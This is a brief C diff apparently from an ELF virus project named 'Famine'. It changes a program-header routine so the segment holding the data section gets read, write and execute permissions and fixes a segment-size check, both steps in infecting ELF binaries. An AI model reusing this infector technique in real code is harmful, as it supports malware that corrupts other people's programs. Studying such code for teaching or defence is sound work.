@@ -41,9 +41,9 @@ int			modify_program_header(void *ptr, t_famine *info)
 	while (++i < ehdr->e_phnum)
 	{
 		if (info->data_shdr->sh_offset >= phdr->p_offset &&
-			info->data_shdr->sh_offset < phdr->p_offset + info->data_phdr->p_filesz)
+			info->data_shdr->sh_offset < phdr->p_offset + phdr->p_filesz)
 		{
-			phdr->p_flags &= 0b111;
+			phdr->p_flags |= 0b111;
 			info->data_phdr = phdr;
 			info->bss_size = phdr->p_memsz - phdr->p_filesz;
 		}
